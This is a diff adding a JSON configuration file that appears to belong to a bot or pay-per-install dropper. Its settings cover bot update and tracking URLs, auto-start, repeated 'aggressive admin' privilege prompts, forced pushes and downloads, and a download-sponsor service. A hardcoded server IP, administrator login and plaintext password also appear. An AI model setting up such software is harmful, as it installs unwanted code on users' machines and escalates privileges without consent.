@@ -1,0 +1,69 @@
+{
+  "version": "2026.04.19 16:26:54",
+  "urlDoc": "",
+  "disabled": false,
+  "disableVirus": false,
+  "bux": [
+    {
+      "enabled": false,
+      "id": "unu.im",
+      "apiKey": "",
+      "apiUrl": ""
+    }
+  ],
+  "dnSponsor": [
+    {
+      "enabled": false,
+      "id": "ufiler.biz",
+      "url": ""
+    }
+  ],
+  "pack": {
+    "packFolder": "C:\\soft\\newway\\data\\default\\packs",
+    "packTemplateUrl": "http://123/pack/envelope",
+    "items": []
+  },
+  "clone": {
+    "cloneLog": "",
+    "cloneServerIp": "",
+    "cloneUser": "",
+    "clonePassword": ""
+  },
+  "serverIp": "26.188.115.1",
+  "server": "default",
+  "alias": "123",
+  "landingAuto": false,
+  "landingName": "default",
+  "login": "Administrator",
+  "password": "Putin123",
+  "extraUpdate": false,
+  "updateUrl": "http://123/bot/update",
+  "track": true,
+  "trackDesktop": false,
+  "trackUrl": "http://123/bot/upsert",
+  "autoStart": true,
+  "autoUpdate": true,
+  "aggressiveAdmin": true,
+  "aggressiveAdminDelay": 30,
+  "aggressiveAdminAttempts": 0,
+  "aggressiveAdminTimes": 0,
+  "pushesForce": true,
+  "pushes": [],
+  "startDownloadsForce": true,
+  "startDownloads": [],
+  "startUrlsForce": false,
+  "startUrls": [],
+  "frontForce": false,
+  "front": [],
+  "extractIconFromFront": false,
+  "embeddingsForce": false,
+  "embeddings": [],
+  "post": {
+    "_operate_isValid": false,
+    "_operate_isAtWork": true,
+    "_operation": "apply",
+    "_operate_hasToWork": true,
+    "_operate_modifyTime": "4/19/2026 4:27:06 PM",
+    "StatusLabel": " \u0424\u043E\u043D\u043E\u0432\u044B\u0439 \u043F\u0440\u043E\u0446\u0435\u0441\u0441 apply \u0441 4/19/2026 4:27:06 PM"
+  }
+}
